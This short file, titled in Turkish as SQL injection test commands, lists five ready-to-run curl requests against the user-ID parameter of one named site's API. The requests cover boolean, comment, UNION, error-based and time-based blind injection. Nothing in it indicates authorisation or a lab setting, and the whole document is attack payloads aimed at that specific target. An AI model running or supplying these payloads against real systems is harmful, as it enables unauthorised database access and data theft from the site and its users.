# SQL Injection Test Komutları - nordicmonitor.com

# 1. Basit Boolean-based test
curl "https://nordicmonitor.com/api/user?id=1' OR '1'='1"


# 2. Comment-based test
curl "https://nordicmonitor.com/api/user?id=1'--"
curl "https://nordicmonitor.com/api/user?id=1'/*"


# 3. UNION-based test (kolay tespit)
curl "https://nordicmonitor.com/api/user?id=1' UNION SELECT NULL,NULL--"


# 4. Error-based test
curl "https://nordicmonitor.com/api/user?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"


# 5. Time-based blind test
curl "https://nordicmonitor.com/api/user?id=1'; SELECT pg_sleep(5)--"
